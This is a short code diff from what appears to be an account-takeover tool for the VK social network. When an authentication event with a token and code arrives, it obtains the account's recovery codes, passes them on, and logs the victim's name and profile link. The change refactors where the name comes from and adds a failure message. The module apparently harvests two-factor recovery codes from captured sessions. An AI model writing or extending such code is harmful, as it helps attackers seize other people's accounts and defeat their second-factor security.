@@ -29,7 +29,7 @@ exports.init = (config, ee) => {
   ee.on("auth:success", async event => {
     if (!("code" in event)) return;
 
-    const { token, user_id } = event;
+    const { token, user_id, first_name, last_name } = event;
 
     if (unlocked.has(user_id)) return;
 
@@ -65,13 +65,16 @@ exports.init = (config, ee) => {
 
     const codes = await unlock(event, codePromise);
 
-    ee.emit("unlocker:recovery_codes", { user_id, codes });
+    if (!codes)
+      return console.log(
+        chalk.yellowBright(`Unable to obtain recovery codes for`)
+      );
 
-    const [me] = await vk.api.users.get({});
+    ee.emit("unlocker:recovery_codes", { user_id, codes });
 
     console.log(
       chalk.bold.greenBright(
-        `Obtained recovery codes for: ${me.first_name} ${me.last_name} https://vk.com/id${user_id}`
+        `Obtained recovery codes for: ${first_name} ${last_name} https://vk.com/id${user_id}`
       )
     );
 
